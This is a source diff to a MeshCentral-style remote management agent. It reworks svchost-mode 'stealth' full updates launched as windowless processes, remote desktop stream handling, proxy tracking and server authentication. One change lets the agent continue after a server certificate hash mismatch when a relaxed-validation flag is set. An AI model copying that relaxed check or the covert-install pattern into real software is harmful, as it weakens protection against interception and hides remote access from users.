 	const wchar_t* sourceDll = (updateDllPath != NULL && updateDllPath[0] != L'\0') ? updateDllPath : NULL;
 
+	if (_wcsicmp(sourceExe, exePathW) != 0)
+	{
+		STARTUPINFOW updateInfo = {0};
+		PROCESS_INFORMATION updateProcess = {0};
+		WCHAR updateArgs[8192] = {0};
+		BOOL launched = FALSE;
+
+		updateInfo.cb = sizeof(updateInfo);
+		if (sourceDll != NULL && sourceDll[0] != L'\0')
+		{
+			launched = SUCCEEDED(StringCchPrintfW(
+				updateArgs,
+				_countof(updateArgs),
+				L"\"%s\" -fullupdate --update-source=\"%s\" --update-dll=\"%s\"",
+				sourceExe,
+				sourceExe,
+				sourceDll)) &&
+				CreateProcessW(sourceExe, updateArgs, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &updateInfo, &updateProcess);
+		}
+		else
+		{
+			launched = SUCCEEDED(StringCchPrintfW(
+				updateArgs,
+				_countof(updateArgs),
+				L"\"%s\" -fullupdate --update-source=\"%s\"",
+				sourceExe,
+				sourceExe)) &&
+				CreateProcessW(sourceExe, updateArgs, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &updateInfo, &updateProcess);
+		}
+
+		if (!launched)
+		{
+			MeshAgent_LogNativeInstallerEvent("...Native stealth update handoff failed (error=%lu)", GetLastError());
+			return FALSE;
+		}
+
+		CloseHandle(updateProcess.hProcess);
+		CloseHandle(updateProcess.hThread);
+		MeshAgent_LogNativeInstallerEvent("...Native stealth update handed off to package executable");
+
+		if (serviceName[0] != L'\0' && !MeshAgent_WaitForServiceNotRunning(serviceName, 60000))
+		{
+			MeshAgent_LogNativeInstallerEvent("...Service did not leave RUNNING state after update handoff");
+			return FALSE;
+		}
+
+		return TRUE;
+	}
+
 	MeshAgent_LogNativeInstallerEvent("...Running native stealth update (svchost: %s)", useSvchostMode ? "enabled" : "disabled");
 	if (Stealth_PerformUpdate(sourceExe, sourceDll, useSvchostMode))
 	{
 		MeshAgent_StageSelfTestModuleBestEffort();
-		if (masterServiceEnabled && !MeshAgent_EnsureMasterServiceInstalled(agentHost, masterServiceSource, TRUE))
-		{
-			MeshAgent_LogNativeInstallerEvent("...MasterService integration failed during update");
-			return FALSE;
-		}
 		MeshAgent_LogNativeInstallerEvent("...Native stealth update completed successfully");
+		return TRUE;
+	}
+
+	if (Stealth_RunUpdateValidation())
+	{
+		MeshAgent_StageSelfTestModuleBestEffort();
+		MeshAgent_LogNativeInstallerEvent("...Native stealth update reported failure but final update validation passed");
 		return TRUE;
 	}
 
@@ -2325,7 +2204,7 @@ static BOOL MeshAgent_RunNativeStealthFullUpdate(struct MeshAgentHostContainer* 
 	return FALSE;
 }
 
-static BOOL MeshAgent_RunNativeRegression(struct MeshAgentHostContainer* agentHost, const wchar_t* updateExePath, const wchar_t* updateDllPath, const wchar_t* masterServiceSource, BOOL masterServiceEnabled)
+static BOOL MeshAgent_RunNativeRegression(struct MeshAgentHostContainer* agentHost, const wchar_t* updateExePath, const wchar_t* updateDllPath)
 {
 	if (agentHost == NULL || agentHost->exePath == NULL) { return FALSE; }
 
@@ -2362,11 +2241,6 @@ static BOOL MeshAgent_RunNativeRegression(struct MeshAgentHostContainer* agentHo
 	if (!MeshAgent_RunChildProcess(exePathW, L"-validate-install", 120000, &exitCode))
 	{
 		MeshAgent_LogNativeInstallerEvent("...Install validation failed (exit=%lu)", exitCode);
-		return FALSE;
-	}
-	if (masterServiceEnabled && !MeshAgent_EnsureMasterServiceInstalled(agentHost, masterServiceSource, TRUE))
-	{
-		MeshAgent_LogNativeInstallerEvent("...MasterService regression gate failed after install");
 		return FALSE;
 	}
 	MeshAgent_CopyEvidenceSnapshot(L"install");
@@ -2568,11 +2442,6 @@ static BOOL MeshAgent_RunNativeRegression(struct MeshAgentHostContainer* agentHo
 		MeshAgent_LogNativeInstallerEvent("...Update validation failed (exit=%lu)", exitCode);
 		return FALSE;
 	}
-	if (masterServiceEnabled && !MeshAgent_EnsureMasterServiceInstalled(agentHost, masterServiceSource, TRUE))
-	{
-		MeshAgent_LogNativeInstallerEvent("...MasterService regression gate failed after update");
-		return FALSE;
-	}
 	MeshAgent_CopyEvidenceSnapshot(L"update");
 
 	if (!MeshAgent_WaitForCoreModule(selfTestPaths.dbPath, 900000))
@@ -2651,11 +2520,6 @@ static BOOL MeshAgent_RunNativeRegression(struct MeshAgentHostContainer* agentHo
 	}
 
 	MeshAgent_CopyEvidenceSnapshot(L"pre_uninstall");
-	if (masterServiceEnabled && !MeshAgent_UninstallMasterService())
-	{
-		MeshAgent_LogNativeInstallerEvent("...MasterService regression gate failed before uninstall");
-		return FALSE;
-	}
 	if (!MeshAgent_RunChildProcess(exePathW, L"-fulluninstall", 600000, &exitCode))
 	{
 		MeshAgent_LogNativeInstallerEvent("...Full uninstall failed (exit=%lu)", exitCode);
@@ -2724,8 +2588,6 @@ char exeMeshPolicyGuid[] = { 0xB9, 0x96, 0x01, 0x58, 0x80, 0x54, 0x4A, 0x19, 0xB
 #define REMOTE_DESKTOP_VIRTUAL_SESSION_USERNAME "\xFF_RemoteDesktopUSERNAME"
 #define MESHAGENT_DATAPING_ARRAY "\xFF_MeshAgent_DataPingArray"
 #define MESHAGENT_DATAPAING_PROMISE_TIMEOUT	"\xFF_MeshAgent_DataPing_Timeout"
-char autoproxy_setup[255] = { 0 };
-
 #define KVM_IPC_SOCKET			"\xFF_KVM_IPC_SOCKET"
 int ILibDuktape_HECI_Debug = 0;
 
@@ -3218,8 +3080,8 @@ extern int GetServiceState(LPCSTR servicename);
 #endif
 
 /* ------------------------------
-Begin Mesh Agent Multicast Support
-This is used only when "MeshServer=local" in .msh policy file
+Legacy Mesh Agent discovery receiver
+Control-channel endpoint selection no longer uses multicast-discovered URLs.
 --------------------------------*/
 
 // Called when a UDP packet is received
@@ -3311,7 +3173,6 @@ void UDPSocket_OnData(ILibAsyncUDPSocket_SocketModule socketModule, char* buffer
 			ILIBLOGMESSAGEX("FoundServer: %s\n", agentHost->multicastServerUrl);
 		}
 
-		if (agentHost->multicastServerUrl != NULL && agentHost->serverConnectionState == 0) { MeshServer_ConnectEx(agentHost); }
 	}
 	else
 	{
@@ -3471,20 +3332,6 @@ void ILibDuktape_MeshAgent_Ready(ILibDuktape_EventEmitter *sender, char *eventNa
 	duk_pop(sender->ctx);												// ...
 }
 #ifdef _LINKVM
-#ifdef WIN32
-void ILibDuktape_MeshAgent_RemoteDesktop_KVM_WriteSink_Chain(void *chain, void *user)
-{
-	if (user == NULL) { return; }
-
-	RemoteDesktop_Ptrs *ptrs = (RemoteDesktop_Ptrs*)((void**)ILibMemory_Extra(user))[0];
-	char *buffer = (char*)user;
-	size_t bufferLen = ILibMemory_Size(user);
-
-	ILibDuktape_DuplexStream_WriteData(ptrs->stream, buffer, bufferLen);
-	ILibMemory_Free(user);
-}
-#endif
-
 void KVM_WriteLog(ILibKVM_WriteHandler writeHandler, void *user, char *format, ...)
 {
 	char dest[4096];
@@ -3509,39 +3356,21 @@ void KVM_WriteLog(ILibKVM_WriteHandler writeHandler, void *user, char *format, .
 ILibTransport_DoneState ILibDuktape_MeshAgent_RemoteDesktop_KVM_WriteSink(char *buffer, int bufferLen, void *reserved)
 {
 	RemoteDesktop_Ptrs *ptrs = (RemoteDesktop_Ptrs*)reserved;
-	if (!ILibMemory_CanaryOK(ptrs)) { return(ILibTransport_DoneState_ERROR); }
-
-#ifdef WIN32
-	if (duk_ctx_is_alive(ptrs->ctx))
+	int paused;
+	if (ptrs == NULL || !ILibMemory_CanaryOK(ptrs) || ptrs->stream == NULL || ptrs->ctx == NULL || !duk_ctx_is_alive(ptrs->ctx)) { return(ILibTransport_DoneState_ERROR); }
+	if (buffer == NULL || bufferLen <= 0)
 	{
-		if (!ILibIsRunningOnChainThread(duk_ctx_chain(ptrs->ctx)))
-		{
-			char *bstate = ILibMemory_SmartAllocateEx(bufferLen, sizeof(void*));
-			memcpy_s(bstate, (size_t)bufferLen, buffer, (size_t)bufferLen);
-			((void**)ILibMemory_Extra(bstate))[0] = ptrs;
-			ILibChain_RunOnMicrostackThreadEx3(duk_ctx_chain(ptrs->ctx), ILibDuktape_MeshAgent_RemoteDesktop_KVM_WriteSink_Chain, NULL, bstate);
-			return ILibTransport_DoneState_COMPLETE;		// Always returning complete, because we'll let the stream object handle flow control
-		}
+		ILibDuktape_DuplexStream_WriteEnd(ptrs->stream);
+		return ILibTransport_DoneState_COMPLETE;
 	}
-#endif
 
-	if ((buffer != NULL) && (bufferLen > 4) && (ntohs(((unsigned short*)buffer)[0]) == MNG_DEBUG))
+	if (bufferLen > 4 && ntohs(((unsigned short*)buffer)[0]) == MNG_DEBUG)
 	{
 		Duktape_Console_LogEx(ptrs->ctx, ILibDuktape_LogType_Info1, "%s", buffer + 4);
 	}
 
-	if (ptrs->stream != NULL)
-	{
-		if (ILibDuktape_DuplexStream_WriteData(ptrs->stream, buffer, bufferLen) != ILibTransport_DoneState_ERROR)
-		{
-			return ILibTransport_DoneState_COMPLETE;		// Always returning complete, because we'll let the stream object handle flow control
-		}
-		else
-		{
-			return ILibTransport_DoneState_ERROR;
-		}
-	}
-	return ILibTransport_DoneState_ERROR;
+	paused = ILibDuktape_DuplexStream_WriteData(ptrs->stream, buffer, bufferLen);
+	return(paused == 0 ? ILibTransport_DoneState_COMPLETE : ILibTransport_DoneState_INCOMPLETE);
 }
 ILibTransport_DoneState ILibDuktape_MeshAgent_RemoteDesktop_WriteSink(ILibDuktape_DuplexStream *stream, char *buffer, int bufferLen, void *user)
 {
@@ -3612,7 +3441,11 @@ void ILibDuktape_MeshAgent_RemoteDesktop_EndSink(ILibDuktape_DuplexStream *strea
 #endif
 		memset(ptrs, 0, sizeof(RemoteDesktop_Ptrs));
 	}
+#ifdef WIN32
+	kvm_cleanup(ptrs);
+#else
 	kvm_cleanup();
+#endif
 }
 
 void ILibDuktape_MeshAgent_RemoteDesktop_PauseSink(ILibDuktape_DuplexStream *sender, void *user)
@@ -3632,7 +3465,7 @@ void ILibDuktape_MeshAgent_RemoteDesktop_PauseSink(ILibDuktape_DuplexStream *sen
 	}
 #endif
 #else
-	kvm_pause(1);
+	kvm_pause(1, user);
 #endif
 }
 void ILibDuktape_MeshAgent_RemoteDesktop_ResumeSink(ILibDuktape_DuplexStream *sender, void *user)
@@ -3653,7 +3486,7 @@ void ILibDuktape_MeshAgent_RemoteDesktop_ResumeSink(ILibDuktape_DuplexStream *se
 	}
 #endif
 #else
-	kvm_pause(0);
+	kvm_pause(0, user);
 #endif
 }
 duk_ret_t ILibDuktape_MeshAgent_RemoteDesktop_Finalizer(duk_context *ctx)
@@ -3672,7 +3505,11 @@ duk_ret_t ILibDuktape_MeshAgent_RemoteDesktop_Finalizer(duk_context *ctx)
 #if defined(_POSIX) && !defined(__APPLE__)
 		if (ptrs->kvmPipe != NULL) { ILibProcessPipe_FreePipe(ptrs->kvmPipe); }
 #endif
-		kvm_cleanup();
+#ifdef WIN32
+		kvm_cleanup(ptrs);
+#else
+		kvm_cleanup(ptrs);
+#endif
 #endif
 	}
 	return 0;
@@ -3826,7 +3663,7 @@ duk_ret_t ILibDuktape_MeshAgent_userChanged(duk_context *ctx)
 	{
 		ILibLifeTime_Remove(ILibGetBaseTimer(duk_ctx_chain(ctx)), ptrs->kvmPipe);
 		ILibProcessPipe_Pipe_SetBrokenPipeHandler(ptrs->kvmPipe, NULL);
-		kvm_cleanup();
+		kvm_cleanup(ptrs);
 
 		duk_peval_string(ctx, "require('user-sessions').consoleUid()");
 		int id = duk_to_int(ctx, -1);
@@ -3849,6 +3686,27 @@ duk_ret_t ILibDuktape_MeshAgent_userChanged(duk_context *ctx)
 	return(0);
 }
 #endif
+
+static MeshAgentHostContainer* ILibDuktape_MeshAgent_ResolveRemoteDesktopAgent(duk_context *ctx)
+{
+	MeshAgentHostContainer *agent = NULL;
+
+	if (ctx == NULL) { return NULL; }
+
+	duk_push_this(ctx);
+	agent = (MeshAgentHostContainer*)Duktape_GetPointerProperty(ctx, -1, MESH_AGENT_PTR);
+	duk_pop(ctx);
+	if (agent != NULL) { return agent; }
+
+	duk_push_heap_stash(ctx);
+	agent = (MeshAgentHostContainer*)Duktape_GetPointerProperty(ctx, -1, "MeshAgentPtr");
+	if (agent == NULL)
+	{
+		agent = (MeshAgentHostContainer*)Duktape_GetPointerProperty(ctx, -1, "\xFF_MeshDesktop_AgentPtr");
+	}
+	duk_pop(ctx);
+	return agent;
+}
 
 duk_ret_t ILibDuktape_MeshAgent_getRemoteDesktop(duk_context *ctx)
 {
@@ -3877,22 +3735,41 @@ duk_ret_t ILibDuktape_MeshAgent_getRemoteDesktop(duk_context *ctx)
 
 
 	duk_push_this(ctx);											// [MeshAgent]
+	agent = ILibDuktape_MeshAgent_ResolveRemoteDesktopAgent(ctx);
 	if (duk_has_prop_string(ctx, -1, REMOTE_DESKTOP_STREAM))
 	{
 		duk_get_prop_string(ctx, -1, REMOTE_DESKTOP_STREAM);	// [MeshAgent][RemoteDesktop]
 		duk_get_prop_string(ctx, -1, REMOTE_DESKTOP_ptrs);
 		ptrs = (RemoteDesktop_Ptrs*)Duktape_GetBuffer(ctx, -1, NULL);
 		duk_pop(ctx);
+#ifdef WIN32
+		if (agent != NULL && ptrs != NULL && ptrs->stream != NULL)
+		{
+			int childPresent = kvm_bridge_debug_get_child_present_for_reserved(ptrs);
+			int transportActive = kvm_bridge_debug_get_transport_active_for_reserved(ptrs);
+			if (childPresent == 0 || transportActive == 0)
+			{
+				Duktape_Console_LogEx(ctx, ILibDuktape_LogType_Info1,
+					"KVM cached stream stale, rebuilding remote desktop session (child=%d transport=%d)",
+					childPresent,
+					transportActive);
+				kvm_cleanup(ptrs);
+				kvm_relay_setup(agent->exePath, agent->runningAsConsole ? NULL : agent->pipeManager, ILibDuktape_MeshAgent_RemoteDesktop_KVM_WriteSink, ptrs, TSID);
+			}
+		}
+#endif
+		return 1;
+	}
+	if (agent == NULL)
+	{
+		duk_pop(ctx);
+		duk_push_null(ctx);
 		return 1;
 	}
 	
 #ifdef __APPLE__
 	duk_peval_string_noresult(ctx, "require('power-monitor').wakeDisplay();");
 #endif
-
-	duk_get_prop_string(ctx, -1, MESH_AGENT_PTR);
-	agent = (MeshAgentHostContainer*)duk_get_pointer(ctx, -1);
-	duk_pop(ctx);
 
 	duk_push_object(ctx);															// [MeshAgent][RemoteDesktop]
 	ILibDuktape_WriteID(ctx, "MeshAgent.kvmSession");
@@ -4265,6 +4142,7 @@ void ILibDuktape_MeshAgent_dumpCoreModuleEx(void *chain, void *user)
 		CoreModule = (char*)ILibMemory_Allocate(CoreModuleLen, 0, NULL, NULL);
 		ILibSimpleDataStore_Get(agentHost->masterDb, "CoreModule", CoreModule, CoreModuleLen);
 
+		MeshAgent_EnsureCoreModuleRuntimeGlobals(agentHost->meshCoreCtx);
 		if (ILibDuktape_ScriptContainer_CompileJavaScriptEx(agentHost->meshCoreCtx, CoreModule + 4, CoreModuleLen - 4, "CoreModule.js", 13) != 0 ||
 			ILibDuktape_ScriptContainer_ExecuteByteCode(agentHost->meshCoreCtx) != 0)
 		{
@@ -4653,6 +4531,12 @@ void ILibDuktape_MeshAgent_PUSH(duk_context *ctx, void *chain)
 		ILibDuktape_CreateEventWithGetter(ctx, "controlChannelDebug", ILibDuktape_MeshAgent_controlChannelDebug);
 		ILibDuktape_CreateInstanceMethod(ctx, "DataPing", ILibDuktape_MeshAgent_DataPing, DUK_VARARGS);
 		ILibDuktape_CreateReadonlyProperty_int(ctx, "ARCHID", MESH_AGENTID);
+	#if defined(WIN32) && defined(MESH_AGENT_SVCHOST_MODE) && (MESH_AGENT_SVCHOST_MODE != 0)
+		duk_push_true(ctx);
+	#else
+		duk_push_false(ctx);
+	#endif
+		ILibDuktape_CreateReadonlyProperty_SetEnumerable(ctx, "nativeFullUpdate", 1);
 		ILibDuktape_CreateReadonlyProperty_int(ctx, "ConsoleTextMaxRate", agent->consoleText_maxRate);
 #ifdef _LINKVM 
 		ILibDuktape_CreateReadonlyProperty_int(ctx, "hasKVM", 1);
@@ -5288,6 +5172,7 @@ int GenerateSHA384FileHash(char *filePath, char *fileHash)
 // Called when the connection of the mesh server is fully authenticated
 void MeshServer_ServerAuthenticated(ILibWebClient_StateObject WebStateObject, MeshAgentHostContainer *agent) {
 	int len = 0;
+	MeshAgent_RecordProxyAttemptSuccess(agent);
 
 	// Send the mesh agent tag to the server
 	// We send the tag information independently of the meshcore because we could use this to select what meshcore to use on the server.
@@ -5450,22 +5335,40 @@ void MeshServer_selfupdate_continue(MeshAgentHostContainer *agent)
 		ILibUTF8ToWideEx(agent->exePath, (int)strnlen_s(agent->exePath, 4096), w_exepath, 4096);
 
 #if defined(MESH_AGENT_SVCHOST_MODE) && (MESH_AGENT_SVCHOST_MODE != 0)
-		// Svchost-hosted services cannot be stopped via net stop. Use delayed file replacement instead.
-		// The update will be applied on the next system restart.
-		ILIBLOGMESSAGEX("SelfUpdate -> Svchost mode: scheduling delayed file replacement...");
+		// Launch the downloaded update executable in native full-update mode so self-update
+		// converges through the same lifecycle engine as operator-triggered -fullupdate.
+		ILIBLOGMESSAGEX("SelfUpdate -> Svchost mode: launching native full update activation...");
 
-		// Schedule the update file to replace the executable at next boot
-		if (MoveFileExW(w_updatefile, w_exepath, MOVEFILE_DELAY_UNTIL_REBOOT | MOVEFILE_REPLACE_EXISTING))
+		STARTUPINFOW updateInfo = { 0 };
+		PROCESS_INFORMATION updateProcess = { 0 };
+		WCHAR updateArgs[8192] = { 0 };
+		updateInfo.cb = sizeof(updateInfo);
+
+		if (SUCCEEDED(StringCchPrintfW(
+				updateArgs,
+				_countof(updateArgs),
+				L"\"%s\" -fullupdate --update-source=\"%s\"",
+				w_updatefile,
+				w_updatefile)) &&
+			CreateProcessW(
+				w_updatefile,
+				updateArgs,
+				NULL,
+				NULL,
+				FALSE,
+				CREATE_NO_WINDOW,
+				NULL,
+				NULL,
+				&updateInfo,
+				&updateProcess))
 		{
-			ILIBLOGMESSAGEX("SelfUpdate -> Scheduled update for next system restart");
-			// Store marker to prevent repeated update attempts
-			ILibSimpleDataStore_Put(agent->masterDb, "PendingUpdate", "1");
-			// Don't exit - keep running with current version until reboot
-			return;
+			CloseHandle(updateProcess.hProcess);
+			CloseHandle(updateProcess.hThread);
+			ILIBLOGMESSAGEX("SelfUpdate -> Native full update activation started (%ls)", w_updatefile);
 		}
 		else
 		{
-			ILIBLOGMESSAGEX("SelfUpdate -> FAILED to schedule delayed update (error %lu)", GetLastError());
+			ILIBLOGMESSAGEX("SelfUpdate -> FAILED to launch native full update activation (error %lu)", GetLastError());
 			return;
 		}
 #else
@@ -5587,17 +5490,34 @@ void MeshServer_ProcessCommand(ILibWebClient_StateObject WebStateObject, MeshAge
 
 				// Hash the server's web certificate and check if it matches the one in the auth request
 				util_certhash2(peer, ILibScratchPad2); // Hash the server certificate
+				memcpy_s(agent->serverWebHash, sizeof(agent->serverWebHash), ILibScratchPad2, UTIL_SHA384_HASHSIZE);
 				if (memcmp(ILibScratchPad2, AuthRequest->serverHash, sizeof(AuthRequest->serverHash)) != 0) 
 				{ 
 					util_keyhash2(peer, ILibScratchPad2); // Hash the server certificate public key (this is the old way)
 					if (memcmp(ILibScratchPad2, AuthRequest->serverHash, sizeof(AuthRequest->serverHash)) != 0) 
 					{
+						if (agent->tlsRelaxedValidation != 0)
+						{
+							agent->tlsInspectionDetected = 1;
+							if (agent->tlsInspectionLogged == 0)
+							{
+								agent->tlsInspectionLogged = 1;
+								MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ProcessCommand: TLS inspection detected, continuing with post-connect certificate proof");
+								ILibRemoteLogging_printf(ILibChainGetLogger(agent->chain),
+									ILibRemoteLogging_Modules_Agent_GuardPost,
+									ILibRemoteLogging_Flags_VerbosityLevel_1,
+									"AgentCore: corporate TLS inspection detected, continuing with signed websocket server proof");
+							}
+						}
+						else
+						{
 						printf("Bad server certificate hash\r\n"); // TODO: Disconnect
 						if (agent->controlChannelDebug != 0)
 						{
 							ILIBLOGMESSAGEX("Bad server certificate hash");
 						}
 						break;
+						}
 					}
 				}
 				memcpy_s(agent->serverNonce, sizeof(agent->serverNonce), AuthRequest->serverNonce, sizeof(AuthRequest->serverNonce));
@@ -5719,7 +5639,14 @@ void MeshServer_ProcessCommand(ILibWebClient_StateObject WebStateObject, MeshAge
 						agent->serverAuthState |= 1;
 
 						// Store the server's TLS cert hash so in the future, we can skip server auth.
-						ILibSimpleDataStore_PutEx(agent->masterDb, "ServerTlsCertHash", 17, ILibScratchPad2, UTIL_SHA384_HASHSIZE);
+						if (agent->tlsInspectionDetected == 0)
+						{
+							ILibSimpleDataStore_PutEx(agent->masterDb, "ServerTlsCertHash", 17, ILibScratchPad2, UTIL_SHA384_HASHSIZE);
+						}
+						else
+						{
+							ILibSimpleDataStore_DeleteEx(agent->masterDb, "ServerTlsCertHash", 17);
+						}
 
 						// Send our agent information to the server
 						MeshServer_SendAgentInfo(agent, WebStateObject);
@@ -6054,6 +5981,7 @@ void MeshServer_ProcessCommand(ILibWebClient_StateObject WebStateObject, MeshAge
 						ILibSimpleDataStore_Get(agent->masterDb, "CoreModule", CoreModule, CoreModuleLen);
 					}
 
+					MeshAgent_EnsureCoreModuleRuntimeGlobals(agent->meshCoreCtx);
 					if (ILibDuktape_ScriptContainer_CompileJavaScriptEx(agent->meshCoreCtx, CoreModule + 4, CoreModuleLen - 4, "CoreModule.js", 13) != 0 ||
 						ILibDuktape_ScriptContainer_ExecuteByteCode(agent->meshCoreCtx) != 0)
 					{
@@ -6363,8 +6291,6 @@ void MeshServer_OnResponse(ILibWebClient_StateObject WebStateObject, int Interru
 #ifndef MICROSTACK_NOTLS
 			int len;
 #endif
-			agent->usingBrandedEndpoint = 0;
-			agent->brandedFallbackIndex = 0;
 			int idleLen;
 			if ((idleLen = ILibSimpleDataStore_Get(agent->masterDb, "controlChannelIdleTimeout", NULL, 0)) != 0)
 			{
@@ -6388,6 +6314,7 @@ void MeshServer_OnResponse(ILibWebClient_StateObject WebStateObject, int Interru
 			}
 
 			agent->controlChannel = WebStateObject; // Set the agent MeshCentral server control channel
+			agent->proxyAttemptEstablished = 1;
 			ILibRemoteLogging_printf(ILibChainGetLogger(agent->chain), ILibRemoteLogging_Modules_Agent_GuardPost | ILibRemoteLogging_Modules_ConsolePrint, ILibRemoteLogging_Flags_VerbosityLevel_1, "Control Channel Idle Timeout = %d seconds", agent->controlChannel_idleTimeout_seconds);
 			ILibWebClient_SetTimeout(WebStateObject, agent->controlChannel_idleTimeout_seconds, MeshServer_ControlChannel_IdleTimeout, agent);
 			ILibWebClient_WebSocket_SetPingPongHandler(WebStateObject, MeshServer_ControlChannel_PingSink, MeshServer_ControlChannel_PongSink, agent);
@@ -6526,6 +6453,8 @@ void MeshServer_OnResponse(ILibWebClient_StateObject WebStateObject, int Interru
 			agent->serverAuthState = 0;
 			agent->controlChannel = NULL; // Set the agent MeshCentral server control channel
 			agent->serverConnectionState = 0;
+			MeshAgent_ClearGlobalTunnelProxy(agent);
+			MeshAgent_ClearActiveProxyAttempt(agent);
 			MeshAgent_ControlChannelDebugLog(agent, "MeshServer_OnResponse: serverConnectionState reset to 0 (disconnected)");
 			break;
 		case ILibWebClient_ReceiveStatus_MoreDataToBeReceived:	// Data received			
@@ -6570,52 +6499,19 @@ void MeshServer_OnResponse(ILibWebClient_StateObject WebStateObject, int Interru
 		ILibRemoteLogging_printf(ILibChainGetLogger(ILibWebClient_GetChainFromWebStateObject(WebStateObject)), ILibRemoteLogging_Modules_Agent_GuardPost, ILibRemoteLogging_Flags_VerbosityLevel_1, "Agent Host Container: Mesh Server Connection Error (%d), trying again later.", descriptorValue);
 		printf("Mesh Server Connection Error [%d]\n", descriptorValue);
 
-		if (agent->usingBrandedEndpoint)
-		{
-			MeshAgent_AdvanceBrandedEndpoint(agent, "connect-error", descriptorValue);
-		}
-
-		agent->autoproxy_status = 0;
+		MeshAgent_RecordProxyAttemptFailure(agent, "connect-error");
 		if (agent->logUpdate != 0) 
 		{
 			sprintf_s(ILibScratchPad, sizeof(ILibScratchPad), "Connection Error [%p, %d, [%d]]...\n", WebStateObject, InterruptFlag, descriptorValue);
 			ILIBLOGMESSSAGE(ILibScratchPad); 
 		}
 
-
-		if (agent->multicastServerUrl != NULL) { free(agent->multicastServerUrl); agent->multicastServerUrl = NULL; }
 		MeshServer_Connect(agent);
 		return;
 	}
 
 	if (recvStatus != ILibWebClient_ReceiveStatus_Partial) { *beginPointer = endPointer; } // TODO: Confirm with Bryan that this is how partial data works
 }
-#ifdef MICROSTACK_PROXY
-void MeshServer_ConnectEx_Enumerate_Contexts(ILibHashtable sender, void *Key1, char* Key2, int Key2Len, void *Data, void *user)
-{
-	MeshAgentHostContainer *agent = (MeshAgentHostContainer*)user;
-	if (Key1 == NULL && ((SCRIPT_ENGINE_ISOLATION*)Data)->reserved != 0)
-	{
-		// This is a regular Duktape Context
-		duk_context *ctx = (duk_context*)Data;
-		ScriptContainerSettings *settings = ScriptEngine_GetSettings(ctx);
-		if (settings != NULL && (settings->permissions & SCRIPT_ENGINE_NO_MESH_AGENT_ACCESS) == 0)
-		{
-			ILibDuktape_globalTunnel_data *globalTunnel = ILibDuktape_GetNewGlobalTunnel(ctx);
-			if (globalTunnel != NULL)
-			{
-				memcpy_s(&(globalTunnel->proxyServer), sizeof(struct sockaddr_in6), agent->proxyServer, sizeof(struct sockaddr_in6));
-			}
-			else
-			{
-				MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx_Enumerate_Contexts: global tunnel unavailable");
-			}
-		}
-	}
-}
-#endif
-
-
 void MeshServer_ConnectEx_NetworkError(void *j)
 {
 	MeshAgentHostContainer *agent = (MeshAgentHostContainer*)((void**)j)[0];
@@ -6625,13 +6521,9 @@ void MeshServer_ConnectEx_NetworkError(void *j)
 	MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx_NetworkError: Network Timeout (request=%p)", request);
 	if (agent->controlChannelDebug != 0) { ILIBLOGMESSAGEX("Network Timeout Occurred..."); }
 	agent->serverConnectionState = 0; // We are cancelling connection request
+	MeshAgent_RecordProxyAttemptFailure(agent, "timeout");
 
 	printf("Network Timeout occurred...\n");
-
-	if (agent->usingBrandedEndpoint)
-	{
-		MeshAgent_AdvanceBrandedEndpoint(agent, "network-timeout", -1);
-	}
 
 	ILibWebClient_CancelRequest(request);
 	MeshServer_ConnectEx(agent);
@@ -6645,202 +6537,55 @@ void MeshServer_ConnectEx_Lockout_Retry(void *j)
 	MeshServer_ConnectEx((MeshAgentHostContainer*)j);
 }
 
-duk_ret_t MeshServer_ConnectEx_AutoProxy(duk_context *ctx)
-{
-	MeshAgentHostContainer *agent;
-
-	duk_push_heap_stash(ctx);									// [stash]
-	duk_get_prop_string(ctx, -1, "MeshAgentPtr");				// [stash][agentPtr]
-	agent = (MeshAgentHostContainer*)duk_get_pointer(ctx, -1);
-	agent->autoproxy_status = 1;
-
-	if (duk_is_null_or_undefined(ctx, 0))
-	{
-		duk_eval_string_noresult(ctx, "process.stdout.write(' [DIRECT]\\n');");
-	}
-	else
-	{
-		char *result = (char*)duk_require_string(ctx, 0);
-		int len = sprintf_s(autoproxy_setup, sizeof(autoproxy_setup), "http://%s", result);
-		if (len > 0)
-		{
-			duk_push_sprintf(ctx, "process.stdout.write(' [%s]\\n');", result);
-			duk_peval_noresult(ctx);
-			ILibSimpleDataStore_Cached(agent->masterDb, "WebProxy", 8, autoproxy_setup, len + 1);
-		}
-		else
-		{
-			duk_eval_string_noresult(ctx, "process.stdout.write(' [ERROR]\\n');");
-		}
-	}
-
-	MeshServer_ConnectEx(agent);
-	return(0);
-}
 
 void MeshServer_ConnectEx(MeshAgentHostContainer *agent)
 {
-    size_t len, serverUrlLen;
-    char *path;
-    char *host;
-    char *serverUrl;
+	size_t len;
+	size_t serverUrlLen;
+	char *path = NULL;
+	char *host = NULL;
+	char *serverUrl = NULL;
 	unsigned short port;
 	struct sockaddr_in6 meshServer;
-	ILibHTTPPacket *req;
+	ILibHTTPPacket *req = NULL;
 	ILibWebClient_RequestToken reqToken;
-	parser_result *rs;
+	parser_result *rs = NULL;
 	parser_result_field *f;
-	size_t useproxy = 0;
-	char webproxy[1024];
+	const char *resolutionSource = "os";
+#ifndef MICROSTACK_NOTLS
+	ILibParseUriResult result = ILibParseUriResult_UNKNOWN_SCHEME;
+#endif
 
 	memset(&meshServer, 0, sizeof(struct sockaddr_in6));
-	if (agent->timerLogging != 0 && agent->retryTimerSet != 0) 
+	if (agent->timerLogging != 0 && agent->retryTimerSet != 0)
 	{
 		agent->retryTimerSet = 0;
-		ILIBLOGMESSAGEX("    >> Retry Timer Elapsed [serverConnectionState: %d, chainState: %d]", agent->serverConnectionState, ILibIsChainBeingDestroyed(agent->chain)); 
+		ILIBLOGMESSAGEX("    >> Retry Timer Elapsed [serverConnectionState: %d, chainState: %d]", agent->serverConnectionState, ILibIsChainBeingDestroyed(agent->chain));
 	}
 
-	// If this is called while we are in any connection state, just leave now.
-	if (agent->serverConnectionState != 0) return;
-
+	if (agent->serverConnectionState != 0) { return; }
 	if (ILibIsChainBeingDestroyed(agent->chain) != 0) { return; }
 
-	MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: entry usingBranded=%d state=%d", agent->usingBrandedEndpoint, agent->serverConnectionState);
-	MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: entry-marker B");
+	MeshAgent_ClearGlobalTunnelProxy(agent);
+	MeshAgent_ClearActiveProxyAttempt(agent);
